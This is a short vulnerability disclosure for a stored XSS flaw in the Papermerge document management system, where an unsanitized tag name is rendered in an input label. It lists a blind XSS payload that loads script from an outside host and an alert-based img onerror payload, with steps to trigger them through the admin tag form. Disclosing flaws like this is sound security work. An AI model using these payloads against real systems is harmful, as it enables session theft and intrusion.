# Description
Papermerge is an open source document management system (DMS) primarily designed for archiving and retrieving your digital documents. Instead of having piles of paper documents all over your desk, office or drawers - you can quickly scan them and configure your scanner to directly upload to Papermerge DMS. Papermerge DMS on its turn will extract text data from the scanned documents using Optical Character Recognition (OCR) technology the index it and make it searchable. You will be able to quickly find any (scanned!) document using full text search capabilities.
Papermerge is perfect tool to manage PDF, JPEG, TIFF and PNG formats.
# Technical Description
XSS in papermerge DMS via rendering of unsanitized tag name in the input label.
# Proof of Concept

* XSS payloads Used for exploit :
  * blind xss payload : ```"><script src=https://copp.xss.ht></script> ``` **use your own blind payloads**
  * Reflected XSS payload : ```<img src=x onerror=alert(1337)>```

1. setup papermerge in your localhost 
2. move to http://127.0.0.1:8000/admin/tag/add/
3. put the payload in the Name field 
4. BOOM !! XSS triggered
